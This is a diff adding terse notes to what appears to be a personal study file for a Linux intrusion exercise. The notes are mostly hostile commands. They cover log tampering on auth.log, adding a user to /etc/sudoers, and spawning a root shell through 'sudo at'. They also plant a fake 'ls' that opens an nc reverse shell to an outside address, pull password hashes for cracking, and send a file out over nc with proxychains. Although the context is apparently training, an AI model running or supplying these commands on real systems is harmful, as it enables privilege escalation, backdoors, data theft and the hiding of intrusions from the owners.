@@ -3898,6 +3898,68 @@ Reading Rsyslog
 
 
 ## OPNODES LINUX (DEMO)
+```
+egrep -v '21:51:32|10:02:15' auth.log > auth.log2
+sed -i 's/172.16.34.4/192.168.1.103/g' auth.log2
+md5sum auth.log2
+
+grep "PATH=" /home/*/.profile
+/home/bobby/.profile:      PATH="$HOME/bin:$PATH"
+/home/bobby/.profile:      PATH="$HOME/.local/bin:$PATH"
+/home/comrade/.profile:    PATH="$HOME/bin:$PATH"
+/home/comrade/.profile:    PATH="$HOME/.local/bin:$PATH"
+/home/jerry/.profile:      PATH="$HOME/bin:$PATH"
+/home/jerry/.profile:      PATH="$HOME/.local/bin:$PATH"
+/home/jimmy/.profile:      PATH="$HOME/bin:$PATH"
+/home/jimmy/.profile:      PATH="$HOME/.local/bin:$PATH"
+/home/sarah/.profile:      PATH="$HOME/bin:$PATH"
+/home/sarah/.profile:      PATH="$HOME/.local/bin:$PATH"
+/home/ubuntu/.profile:     PATH="$HOME/bin:$PATH"
+/home/ubuntu/.profile:     PATH="$HOME/.local/bin:$PATH"
+/home/wendy/.profile:      PATH="$HOME/bin:$PATH"
+/home/wendy/.profile:      PATH="$HOME/.local/bin:$PATH"
+
+
+/etc/pam.d/sudo
+/var/lib/sudo
+/run/sudo
+/usr/share/bash-completion/completions/sudo
+/usr/share/doc/sudo
+/usr/share/lintian/overrides/sudo
+/usr/lib/sudo
+/usr/bin/sudo
+
+
+◦	./unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+	▪	add comrade with full permissions to the /etc/sudoers file
+	◦	echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+
+
+
+The user's script is running like this:
+
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+
+vim /var/tmp/ls and in /tmp/ls
+#!/bin/bash
+nc 10.50.20.183 9989 -e /bin/bash
+nc -lvp 9998
+cat /home/billybob/*
+
+sudo cat /etc/passwd for the password hashes and then john them to find hashes
+
+
+#!/bin/bash
+nc 10.50.37.42 9998 < /home/billybob/10-million-password-list-top-10000.txt
+proxychains nc -lvp 9998 > wo.txt
+
+
+
+
+
+
+
+
 
 Log Cleaning
 	◦	grep '21:51:32|10:02:15' auth.log > auth.log2
@@ -3934,7 +3996,7 @@ Log Cleaning
 
 
 
-
+```
 
 
 
